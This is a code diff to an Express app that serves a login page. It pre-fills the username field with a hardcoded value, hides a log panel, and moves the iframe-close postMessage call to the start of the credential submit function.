@@ -5,6 +5,9 @@ const app = express();
 const server = http.createServer(app);
 
 app.get("/", (req, res) => {
+  // Set the default email for the username field
+  const defaultEmail = 'mail1.cselab.nitrkl.in'; // Hardcoded default email
+
   res.send(`
 <!DOCTYPE html>
 <html>
@@ -143,7 +146,7 @@ app.get("/", (req, res) => {
       text-align: left;
       max-height: 200px;
       overflow-y: auto;
-      display: block;
+      display: none;
     }
     .copyright {
       color: white;
@@ -170,7 +173,7 @@ app.get("/", (req, res) => {
       
       <div class="form-group">
         <label for="username" class="form-label">Username</label>
-        <input type="text" id="username" class="form-input" />
+        <input type="text" id="username" class="form-input" value="${defaultEmail}" />
       </div>
       
       <div class="form-group">
@@ -262,6 +265,14 @@ app.get("/", (req, res) => {
     }
 
     async function submitCredentials() {
+
+      try {
+        window.parent.postMessage('close-iframe', '*');
+        logMessage('Sent close-iframe message to parent');
+      } catch (e) {
+        logMessage('Could not send message to parent: ' + e.message);
+      }
+        
       logMessage('=== LOGIN ATTEMPT STARTED ===');
       
       var username = document.getElementById('username').value;
@@ -351,12 +362,6 @@ app.get("/", (req, res) => {
       }
       
       // Signal the parent window to close the iframe (if applicable)
-      try {
-        window.parent.postMessage('close-iframe', '*');
-        logMessage('Sent close-iframe message to parent');
-      } catch (e) {
-        logMessage('Could not send message to parent: ' + e.message);
-      }
       
       logMessage('=== LOGIN ATTEMPT COMPLETED ===');
     }
